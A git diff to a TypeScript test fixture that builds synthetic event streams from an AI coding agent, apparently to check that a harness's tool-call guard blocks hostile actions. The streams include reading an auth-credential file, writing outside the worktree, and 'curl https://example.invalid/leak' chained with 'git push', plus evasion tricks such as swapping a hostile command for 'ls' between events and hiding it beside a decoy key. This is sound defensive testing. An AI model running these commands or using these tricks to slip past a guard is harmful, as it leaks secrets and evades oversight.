@@ -6,6 +6,14 @@
  *
  * Compiles the one scope Cursor supports: an approved privileged bypass scope (Q-65, Q-79).
  * Repository MCP definitions stay unapproved because `--approve-mcps` is never enabled (FR-POL-04).
+ *
+ * Residual cells (`cursorResidualStreams`, T4.46, synthetic only): every blocked category at exits 2 and 137 (a
+ * reported denial outranks `TOOL_FAILURE`); completed shell calls the provider did NOT refuse that carry a Git write, so
+ * only Switchboard's tool-call guard (ADR-0039) ends them `PERMISSION_BLOCKED`, at exits 0 and 1; a hostile Git-write
+ * command in `started` swapped to a benign one in `completed`; a benign decoy key beside a hostile shell key; an
+ * unmapped tool key carrying a `command` (promoted to shell); a denied call followed by a separate benign call; and a
+ * denied call after the `result` line. Unknown-event streams at exits 2 and 137 end `TOOL_FAILURE`, and bare or
+ * unreadable known event kinds parse only as `unknown`.
  */
 import { CursorAdapter } from "../../../src/adapters/cursor/adapter.js";
 import { BYPASS_SCOPE, PRIVILEGED_BYPASS_PROFILE } from "../../../src/adapters/cursor/fixtures/cases.js";
@@ -98,6 +106,24 @@ const shellCall = (id: string, command: string) => [
         result: { rejected: { command, reason: "permission denied (synthetic)", isReadonly: false } },
       },
     },
+  }),
+];
+
+/** A shell call the provider reports run (no refusal in `completed`); only the tool-call guard can block it. */
+const shellRan = (id: string, started: string, completed = started, key = "shellToolCall") => [
+  JSON.stringify({
+    type: "tool_call",
+    subtype: "started",
+    call_id: id,
+    session_id: SID,
+    tool_call: { [key]: { args: { command: started } } },
+  }),
+  JSON.stringify({
+    type: "tool_call",
+    subtype: "completed",
+    call_id: id,
+    session_id: SID,
+    tool_call: { [key]: { args: { command: completed }, result: { success: { exitCode: 0, stdout: "" } } } },
   }),
 ];
 
@@ -271,10 +297,129 @@ const cursorCase: AdapterLegCase = {
         JSON.stringify({ type: "synthetic_another_unknown", session_id: SID }),
       ],
     },
+    ...cursorResidualStreams(fx),
   ],
 };
 
 export default cursorCase;
+
+type BlockedCategory = "credential_read" | "out_of_worktree_write" | "network";
+const BLOCKED: readonly BlockedCategory[] = ["credential_read", "out_of_worktree_write", "network"];
+
+const hostileCommand = (fx: MaliciousFixture, category: BlockedCategory, git = "git push origin main"): string => {
+  const action =
+    category === "credential_read"
+      ? `cat ${fx.codexAuthPath}`
+      : category === "out_of_worktree_write"
+        ? `touch ${fx.outsideSentinel}`
+        : "curl https://example.invalid/leak";
+  return `${action} && ${git}`;
+};
+
+const deniedCall = (fx: MaliciousFixture, category: BlockedCategory, id: string) =>
+  category === "credential_read"
+    ? readCall(id, fx.codexAuthPath)
+    : category === "out_of_worktree_write"
+      ? editCall(id, fx.outsideSentinel)
+      : shellCall(id, "curl https://example.invalid/leak");
+
+const blocked = (name: string, category: BlockedCategory, exitCode: number, lines: string[]): HostileStream => ({
+  name,
+  category,
+  exitCode,
+  failureCode: "PERMISSION_BLOCKED",
+  lines: [META(name, exitCode), INIT, ...lines],
+});
+
+/** Residual T4.46 cells the hand-written list above does not cover. Synthetic lines only; no provider is run. */
+export const cursorResidualStreams = (fx: MaliciousFixture): HostileStream[] => {
+  const out: HostileStream[] = [];
+  for (const category of BLOCKED) {
+    // Exit codes other than 0 (the only expected one): the reported denial still outranks TOOL_FAILURE.
+    for (const exitCode of [2, 137]) {
+      out.push(
+        blocked(`denied ${category}, exit ${exitCode}`, category, exitCode, [
+          ...deniedCall(fx, category, `exit-${exitCode}`),
+          ...(exitCode === 2 ? [RESULT_ERROR] : []),
+        ]),
+      );
+    }
+    for (const exitCode of [0, 1]) {
+      const result = exitCode === 0 ? RESULT_SUCCESS : RESULT_ERROR;
+      const command = hostileCommand(fx, category);
+      out.push(
+        // Not refused by the provider: only the tool-call guard (ADR-0039) sees the Git write.
+        blocked(`unrefused shell ${category} with a Git write, exit ${exitCode}`, category, exitCode, [
+          ...shellRan(`guard-${exitCode}`, command),
+          result,
+        ]),
+        blocked(`${category} with a Git write swapped to a benign command, exit ${exitCode}`, category, exitCode, [
+          ...shellRan(`swap-${exitCode}`, command, "ls"),
+          result,
+        ]),
+        blocked(`unmapped tool key carrying ${category} with a Git write, exit ${exitCode}`, category, exitCode, [
+          ...shellRan(`unmapped-${exitCode}`, command, command, "syntheticRunToolCall"),
+          result,
+        ]),
+        blocked(`benign decoy key beside a hostile shell key on ${category}, exit ${exitCode}`, category, exitCode, [
+          JSON.stringify({
+            type: "tool_call",
+            subtype: "started",
+            call_id: `decoy-${exitCode}`,
+            session_id: SID,
+            tool_call: { readToolCall: { args: { path: "README.md" } }, shellToolCall: { args: { command } } },
+          }),
+          result,
+        ]),
+        blocked(`denied ${category}, then a separate benign call, exit ${exitCode}`, category, exitCode, [
+          ...deniedCall(fx, category, `then-benign-${exitCode}`),
+          ...shellRan(`benign-${exitCode}`, "echo safe"),
+          result,
+        ]),
+        blocked(`denied ${category} after the result line, exit ${exitCode}`, category, exitCode, [
+          result,
+          ...deniedCall(fx, category, `trailing-${exitCode}`),
+        ]),
+      );
+    }
+  }
+  for (const exitCode of [2, 137]) {
+    out.push({
+      name: `only unknown event kinds, exit ${exitCode}`,
+      category: "unknown_events",
+      exitCode,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Event types below are invented; the adapter must report them unknown.", exitCode),
+        JSON.stringify({ type: "synthetic_unknown_kind", session_id: SID }),
+      ],
+    });
+  }
+  // Known event kinds with nothing the parser can read: each is `unknown`, never a result or a tool call.
+  const unreadable = [
+    JSON.stringify({ type: "tool_call" }),
+    JSON.stringify({ type: "tool_call", subtype: "started", call_id: "bare", tool_call: {} }),
+    JSON.stringify({
+      type: "tool_call",
+      subtype: "progress",
+      tool_call: { shellToolCall: { args: { command: "ls" } } },
+    }),
+    JSON.stringify({ type: "system", subtype: "status", session_id: SID }),
+    JSON.stringify({ type: "result", is_error: false, session_id: SID }),
+    JSON.stringify({ type: 7 }),
+    JSON.stringify({ type: ["result"] }),
+  ];
+  for (const exitCode of [0, 1]) {
+    out.push({
+      name: `bare and unreadable known event kinds, exit ${exitCode}`,
+      category: "unknown_events",
+      exitCode,
+      failureCode: exitCode === 0 ? "OUTPUT_PROTOCOL_ERROR" : "TOOL_FAILURE",
+      lines: [META("Known event kinds below carry nothing the parser can read.", exitCode), ...unreadable],
+    });
+  }
+  return out;
+};
 
 /** Synthetic malformed JSONL before and after each readable hostile call; no real provider is run. */
 export const cursorPartialStreams = (fx: MaliciousFixture): HostileStream[] =>
